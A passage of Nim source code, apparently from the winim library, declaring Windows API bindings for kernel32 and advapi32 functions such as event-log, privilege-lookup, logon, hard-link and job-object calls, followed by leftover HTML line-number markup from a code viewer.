MoveFileTransacted*(lpExistingFileName: LPCSTR, lpNewFileName: LPCSTR, lpProgressRoutine: LPPROGRESS_ROUTINE, lpData: LPVOID, dwFlags: DWORD, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "MoveFileTransactedA".}  proc ReplaceFile*(lpReplacedFileName: LPCSTR, lpReplacementFileName: LPCSTR, lpBackupFileName: LPCSTR, dwReplaceFlags: DWORD, lpExclude: LPVOID, lpReserved: LPVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "ReplaceFileA".}  proc CreateHardLink*(lpFileName: LPCSTR, lpExistingFileName: LPCSTR, lpSecurityAttributes: LPSECURITY_ATTRIBUTES): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CreateHardLinkA".}  proc CreateHardLinkTransacted*(lpFileName: LPCSTR, lpExistingFileName: LPCSTR, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CreateHardLinkTransactedA".}  proc GetNamedPipeHandleState*(hNamedPipe: HANDLE, lpState: LPDWORD, lpCurInstances: LPDWORD, lpMaxCollectionCount: LPDWORD, lpCollectDataTimeout: LPDWORD, lpUserName: LPSTR, nMaxUserNameSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetNamedPipeHandleStateA".}  proc CallNamedPipe*(lpNamedPipeName: LPCSTR, lpInBuffer: LPVOID, nInBufferSize: DWORD, lpOutBuffer: LPVOID, nOutBufferSize: DWORD, lpBytesRead: LPDWORD, nTimeOut: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CallNamedPipeA".}  proc SetVolumeLabel*(lpRootPathName: LPCSTR, lpVolumeName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetVolumeLabelA".}  proc ClearEventLog*(hEventLog: HANDLE, lpBackupFileName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "ClearEventLogA".}  proc BackupEventLog*(hEventLog: HANDLE, lpBackupFileName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "BackupEventLogA".}  proc OpenEventLog*(lpUNCServerName: LPCSTR, lpSourceName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "advapi32", importc: "OpenEventLogA".}  proc RegisterEventSource*(lpUNCServerName: LPCSTR, lpSourceName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "advapi32", importc: "RegisterEventSourceA".}  proc OpenBackupEventLog*(lpUNCServerName: LPCSTR, lpFileName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "advapi32", importc: "OpenBackupEventLogA".}  proc ReadEventLog*(hEventLog: HANDLE, dwReadFlags: DWORD, dwRecordOffset: DWORD, lpBuffer: LPVOID, nNumberOfBytesToRead: DWORD, pnBytesRead: ptr DWORD, pnMinNumberOfBytesNeeded: ptr DWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "ReadEventLogA".}  proc ReportEvent*(hEventLog: HANDLE, wType: WORD, wCategory: WORD, dwEventID: DWORD, lpUserSid: PSID, wNumStrings: WORD, dwDataSize: DWORD, lpStrings: ptr LPCSTR, lpRawData: LPVOID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "ReportEventA".}  proc IsBadStringPtr*(lpsz: LPCSTR, ucchMax: UINT_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "IsBadStringPtrA".}  proc LookupPrivilegeValue*(lpSystemName: LPCSTR, lpName: LPCSTR, lpLuid: PLUID): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "LookupPrivilegeValueA".}  proc LookupPrivilegeName*(lpSystemName: LPCSTR, lpLuid: PLUID, lpName: LPSTR, cchName: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "LookupPrivilegeNameA".}  proc LookupPrivilegeDisplayName*(lpSystemName: LPCSTR, lpName: LPCSTR, lpDisplayName: LPSTR, cchDisplayName: LPDWORD, lpLanguageId: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "LookupPrivilegeDisplayNameA".}  proc BuildCommDCB*(lpDef: LPCSTR, lpDCB: LPDCB): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "BuildCommDCBA".}  proc BuildCommDCBAndTimeouts*(lpDef: LPCSTR, lpDCB: LPDCB, lpCommTimeouts: LPCOMMTIMEOUTS): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "BuildCommDCBAndTimeoutsA".}  proc CommConfigDialog*(lpszName: LPCSTR, hWnd: HWND, lpCC: LPCOMMCONFIG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CommConfigDialogA".}  proc GetDefaultCommConfig*(lpszName: LPCSTR, lpCC: LPCOMMCONFIG, lpdwSize: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetDefaultCommConfigA".}  proc SetDefaultCommConfig*(lpszName: LPCSTR, lpCC: LPCOMMCONFIG, dwSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetDefaultCommConfigA".}  proc GetComputerName*(lpBuffer: LPSTR, nSize: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetComputerNameA".}  proc SetComputerName*(lpComputerName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetComputerNameA".}  proc DnsHostnameToComputerName*(Hostname: LPCSTR, ComputerName: LPSTR, nSize: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "DnsHostnameToComputerNameA".}  proc GetUserName*(lpBuffer: LPSTR, pcbBuffer: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "GetUserNameA".}  proc LogonUser*(lpszUsername: LPCSTR, lpszDomain: LPCSTR, lpszPassword: LPCSTR, dwLogonType: DWORD, dwLogonProvider: DWORD, phToken: PHANDLE): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "LogonUserA".}  proc LogonUserEx*(lpszUsername: LPCSTR, lpszDomain: LPCSTR, lpszPassword: LPCSTR, dwLogonType: DWORD, dwLogonProvider: DWORD, phToken: PHANDLE, ppLogonSid: ptr PSID, ppProfileBuffer: ptr PVOID, pdwProfileLength: LPDWORD, pQuotaLimits: PQUOTA_LIMITS): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "LogonUserExA".}  proc CreatePrivateNamespace*(lpPrivateNamespaceAttributes: LPSECURITY_ATTRIBUTES, lpBoundaryDescriptor: LPVOID, lpAliasPrefix: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreatePrivateNamespaceA".}  proc OpenPrivateNamespace*(lpBoundaryDescriptor: LPVOID, lpAliasPrefix: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "OpenPrivateNamespaceA".}  proc CreateBoundaryDescriptor*(Name: LPCSTR, Flags: ULONG): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateBoundaryDescriptorA".}  proc GetCurrentHwProfile*(lpHwProfileInfo: LPHW_PROFILE_INFOA): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "GetCurrentHwProfileA".}  proc VerifyVersionInfo*(lpVersionInformation: LPOSVERSIONINFOEXA, dwTypeMask: DWORD, dwlConditionMask: DWORDLONG): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "VerifyVersionInfoA".}  proc CreateJobObject*(lpJobAttributes: LPSECURITY_ATTRIBUTES, lpName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateJobObjectA".}  proc OpenJobObject*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "OpenJobObjectA".}  proc FindFirstVolumeMountPoint*(lpszRootPathName: LPCSTR, lpszVolumeMountPoint: LPSTR, cchBufferLength: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "FindFirstVolumeMountPointA".}  proc FindNextVolumeMountPoint*(hFindVolumeMountPoint: HANDLE, lpszVolumeMountPoint: LPSTR, cchBufferLength: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "FindNextVolumeMountPointA".}  proc SetVolumeMountPoint*(lpszVolumeMountPoint: LPCSTR, lpszVolumeName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetVolumeMountPointA".}  proc CreateActCtx*(pActCtx: PCACTCTXA): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateActCtxA".}  proc FindActCtxSectionString*(dwFlags: DWORD, lpExtensionGuid: ptr GUID, ulSectionId: ULONG, lpStringToFind: LPCSTR, ReturnedData: PACTCTX_SECTION_KEYED_DATA): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "FindActCtxSectionStringA".}  proc CreateSymbolicLink*(lpSymlinkFileName: LPCSTR, lpTargetFileName: LPCSTR, dwFlags: DWORD): BOOLEAN {.winapi, stdcall, dynlib: "kernel32", importc: "CreateSymbolicLinkA".}  proc CreateSymbolicLinkTransacted*(lpSymlinkFileName: LPCSTR, lpTargetFileName: LPCSTR, dwFlags: DWORD, hTransaction: HANDLE): BOOLEAN {.winapi, stdcall, dynlib: "kernel32", importc: "CreateSymbolicLinkTransactedA".}  proc LookupAccountNameLocal*(lpAccountName: LPCSTR, Sid: PSID, cbSid: LPDWORD, ReferencedDomainName: LPSTR, cchReferencedDomainName: LPDWORD, peUse: PSID_NAME_USE): WINBOOL {.winapi, inline.} = LookupAccountNameA(nil, lpAccountName, Sid, cbSid, ReferencedDomainName, cchReferencedDomainName, peUse)  proc LookupAccountSidLocal*(Sid: PSID, Name: LPSTR, cchName: LPDWORD, ReferencedDomainName: LPSTR, cchReferencedDomainName: LPDWORD, peUse: PSID_NAME_USE): WINBOOL {.winapi, inline.} = LookupAccountSidA(nil, Sid, Name, cchName, ReferencedDomainName, cchReferencedDomainName, peUse)when winimCpu64:  const    SCS_THIS_PLATFORM_BINARY* = SCS_64BIT_BINARY  proc GetEnabledXStateFeatures*(): DWORD64 {.winapi, stdcall, dynlib: "kernel32", importc.}  proc GetXStateFeaturesMask*(Context: PCONTEXT, FeatureMask: PDWORD64): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}  proc LocateXStateFeature*(Context: PCONTEXT, FeatureId: DWORD, Length: PDWORD): PVOID {.winapi, stdcall, dynlib: "kernel32", importc.}  proc SetXStateFeaturesMask*(Context: PCONTEXT, FeatureMask: DWORD64): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}when winimCpu32:  const    SCS_THIS_PLATFORM_BINARY* = SCS_32BIT_BINARY<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></spa